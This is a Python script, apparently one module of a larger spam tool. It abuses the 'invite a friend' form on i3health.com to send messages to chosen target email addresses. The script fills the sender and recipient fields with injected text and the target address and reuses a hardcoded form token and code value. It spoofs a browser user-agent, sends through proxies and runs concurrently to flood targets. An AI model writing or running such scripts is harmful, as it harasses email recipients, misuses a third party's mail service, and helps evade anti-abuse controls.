import requests

import module

headers = {
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
}

params = {
    'option': 'com_inviterefer',
    'view': 'inviterefer',
    'Itemid': '3737',
}
url = 'https://www.i3health.com/index.php'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        text = self.get_text()
        data = [
            ('fb0e791c620794fd46672773ee2ebaae', '1'),
            ('option', 'com_inviterefer'),
            ('task', 'send'),
            ('recommend_from_name', text),
            ('recommend_from_email', target),
            ('recommend_to_name0', text),
            ('recommend_to_email0', target),
            ('recommend_to_name1', text),
            ('recommend_to_email1', target),
            ('recommend_to_name2', text),
            ('recommend_to_email2', target),
            ('recommend_to_name3', text),
            ('recommend_to_email3', target),
            ('recommend_text', text),
            ('Submit', 'Send Invitation'),
            ('recommend_option', 'send'),
            ('scode', 'c21xY3E='),
            ('scode2', ''),
            ('fb0e791c620794fd46672773ee2ebaae', '1'),
        ]

        response = requests.post(url, params=params, headers=headers, data=data, proxies=self.get_proxies())
        return response


if __name__ == '__main__':
    project_name = 'i3health'
    success_message = 'Thank you '

    spam = ConcreteSpam(project_name, success_message)
    res = spam.send_post()
    if res:
        spam.run_concurrently()
